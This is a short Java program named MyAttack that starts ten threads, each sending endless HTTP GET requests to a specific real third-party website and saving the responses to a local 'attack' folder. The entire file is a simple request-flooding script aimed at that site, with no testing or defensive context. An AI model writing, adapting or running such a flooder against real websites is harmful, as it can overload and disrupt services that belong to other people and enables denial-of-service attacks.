package com.xbb.net.application;

import com.xbb.common.GetPostUtil;
import com.xbb.common.MyStream;
import com.xbb.common.RandomString;

public class MyAttack extends Thread{

	public static final int THEADS_MAX = 10;

	public static int THREAD_COUNT = 0;
	
	public static void main(String[] args){
		
		for(THREAD_COUNT = 0;THREAD_COUNT < THEADS_MAX;THREAD_COUNT++){
			System.out.println("--->"+THREAD_COUNT);
			new Thread(new MyAttack()).start();
		}
		
	}

	@Override
	public void run() {
//		synchronized (MyAttack.class) {
			GetPostUtil getPostUtil = new GetPostUtil();
			while(true){
				String contenet =getPostUtil.sendGet("http://www.szhaorui.com/", null,"GBK");
				MyStream myStream = new MyStream();
//					System.out.println(contenet);
				String name = System.currentTimeMillis()+RandomString.randomString(6);
				if(contenet.length()>1000){
					myStream.writeToFileByByte("D:/test/attack/",name, contenet);
				}else{
					System.out.println("小于1000");
				}
			}
			
			
//		}
	}
	
	
}
